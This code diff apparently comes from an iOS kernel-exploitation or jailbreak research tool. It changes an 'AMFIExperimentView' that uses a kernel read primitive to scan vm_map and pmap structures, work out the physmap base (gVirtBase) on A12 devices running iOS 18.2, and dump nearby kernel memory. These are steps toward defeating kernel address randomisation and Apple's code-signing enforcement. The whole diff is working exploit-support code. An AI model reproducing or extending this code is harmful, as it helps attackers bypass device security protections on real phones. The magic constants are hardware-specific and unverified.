@@ -3624,7 +3624,7 @@ struct AMFIExperimentView: View {
         var foundPhysBase: UInt64 = 0
         var foundVirtBase: UInt64 = 0
         
-        for off: UInt64 in stride(from: 0x28, to: 0x58, by: 8) {
+        for off: UInt64 in stride(from: 0x28, to: 0x60, by: 8) {
             let candidate = ds_kread64_safe(vmMap + off)
             if !isZonePtr(candidate) { continue }
             
@@ -3632,8 +3632,12 @@ struct AMFIExperimentView: View {
             let tte = ds_kread64_safe(candidate + 0x00)
             let ttep = ds_kread64_safe(candidate + 0x08)
             
-            // tte = physmap VA (zone range), ttep = physical (0x8...)
-            if isZonePtr(tte) && ttep >= 0x800000000 && ttep < 0xC00000000 {
+            // tte = physmap VA (any kernel pointer > 0xffffffd...)
+            // ttep = physical address (0x8... on A12 DRAM)
+            let tteValid = tte > 0xffffffd000000000
+            let ttepValid = ttep >= 0x800000000 && ttep < 0xC00000000
+            
+            if tteValid && ttepValid {
                 detail += "pmap at map+0x\(String(format: "%x", off)): 0x\(String(format: "%llx", candidate)) ✅\n"
                 detail += "  tte (physmap VA): 0x\(String(format: "%llx", tte))\n"
                 detail += "  ttep (physical):  0x\(String(format: "%llx", ttep))\n\n"
@@ -3648,8 +3652,8 @@ struct AMFIExperimentView: View {
                 detail += "gPhysBase = 0x800000000 (A12 constant)\n"
                 detail += "gVirtBase = 0x\(String(format: "%llx", gVirtBaseCalc))\n\n"
                 
-                if gVirtBaseCalc > 0xffffffde00000000 && gVirtBaseCalc < 0xffffffe500000000 {
-                    detail += "✅ gVirtBase in expected zone range!\n\n"
+                if gVirtBaseCalc > 0xffffffd000000000 {
+                    detail += "✅ gVirtBase looks valid!\n\n"
                     
                     // VERIFY: read kernel base via physmap
                     let kernPhys = kernBase &- gVirtBaseCalc &+ gPhysBaseCalc
@@ -3671,9 +3675,25 @@ struct AMFIExperimentView: View {
                     }
                     foundPhysBase = gPhysBaseCalc
                     foundVirtBase = gVirtBaseCalc
-                } else {
-                    detail += "⚠️ gVirtBase out of expected range\n"
                 }
+                break
+            }
+            
+            // Also try: tte might be stored differently on iOS 18.2
+            // Check if candidate+0x00 is a large number that could be physical
+            if tte >= 0x800000000 && tte < 0xC00000000 && ttep > 0xffffffd000000000 {
+                // Reversed: ttep is actually the VA, tte is the PA
+                detail += "pmap (REVERSED) at map+0x\(String(format: "%x", off)): 0x\(String(format: "%llx", candidate))\n"
+                detail += "  [+0x00] physical: 0x\(String(format: "%llx", tte))\n"
+                detail += "  [+0x08] VA:       0x\(String(format: "%llx", ttep))\n\n"
+                
+                let physmapSlide = ttep &- tte
+                let gPhysBaseCalc: UInt64 = 0x800000000
+                let gVirtBaseCalc = gPhysBaseCalc &+ physmapSlide
+                
+                detail += "🎉 PHYSMAP (reversed): gVirtBase = 0x\(String(format: "%llx", gVirtBaseCalc))\n"
+                foundPhysBase = gPhysBaseCalc
+                foundVirtBase = gVirtBaseCalc
                 break
             }
         }
@@ -3684,6 +3704,20 @@ struct AMFIExperimentView: View {
                 let v = ds_kread64_safe(vmMap + off)
                 let tag = isZonePtr(v) ? " ← zone" : ""
                 detail += "  +0x\(String(format: "%02x", off)): 0x\(String(format: "%016llx", v))\(tag)\n"
+            }
+            
+            // Try reading tte/ttep from each zone pointer candidate
+            detail += "\n=== Deep probe zone candidates ===\n"
+            for off: UInt64 in [0x30, 0x38, 0x50, 0x58] {
+                let candidate = ds_kread64_safe(vmMap + off)
+                if !isZonePtr(candidate) { continue }
+                let v0 = ds_kread64_safe(candidate + 0x00)
+                let v1 = ds_kread64_safe(candidate + 0x08)
+                let v2 = ds_kread64_safe(candidate + 0x10)
+                detail += "  map+0x\(String(format: "%x", off)) → 0x\(String(format: "%llx", candidate)):\n"
+                detail += "    [+0x00] 0x\(String(format: "%016llx", v0))\n"
+                detail += "    [+0x08] 0x\(String(format: "%016llx", v1))\n"
+                detail += "    [+0x10] 0x\(String(format: "%016llx", v2))\n"
             }
         }
         
